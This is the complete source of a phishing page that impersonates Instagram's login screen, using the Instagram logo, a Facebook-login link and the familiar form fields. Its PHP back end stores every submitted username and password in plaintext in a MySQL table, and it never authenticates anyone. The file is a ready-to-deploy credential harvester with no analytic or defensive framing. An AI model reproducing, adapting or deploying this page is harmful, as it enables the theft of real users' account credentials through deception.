<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="css/index.css">
    <link rel="icon" href="pic.png" type="image/png">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
            <form  method="POST">
    <input type="text" name="username" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" name="conexion">Log In</button>
</form>

            <div class="or-separator">
                <span>OR</span>
            </div>
            <a href="Facebook.php" class="facebook-login">Log in with Facebook</a>
            <p class="forgot-password" href="https://www.instagram.com/accounts/login/?next=%2Flivein.now%2Ftagged%2F&source=profile_tagged_tab"><a href="#">Forgot password?</a></p>
        </div>
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>



<?php
// Define a global variable to hold the PDO connection
$pdo = null;

function ToConnect()
{
    global $pdo; // Use the global $pdo variable

    // Define database credentials
    $host = 'localhost';
    $dbname = 'Instagram'; // Database name with capital 'I'
    $user = 'root';
    $pass = '';

    try {
        // Create a new PDO instance
        $pdo = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
        // Set error mode to exception
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    } catch (PDOException $e) {
        // Handle connection error
        echo "Connection failed: " . $e->getMessage();
        exit; // Stop further execution
    }
}

function ToDisconnect()
{
    global $pdo; // Use the global $pdo variable
    $pdo = null; // Close the connection by setting it to null
}

function AddUser($username, $password)
{
    global $pdo; // Use the global $pdo variable

    // Prepare the SQL statement with placeholders
    $sql = "INSERT INTO user_infos ( username , password) VALUES (:username, :password)";

    try {
        $stmt = $pdo->prepare($sql);
        // Bind parameters
        $stmt->bindParam(':username', $username);
        $stmt->bindParam(':password', $password);

        // Execute the statement
        $stmt->execute();
       
    } catch (PDOException $e) {
        // Handle SQL error
        echo "Error: " . $e->getMessage();
    }
}

// Initialize connection
ToConnect();

// Check if the form was submitted
if (isset($_POST['conexion'])) {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        // Add user to the database
        AddUser($username, $password);
    } 
     
}

// Close the connection
ToDisconnect();
?>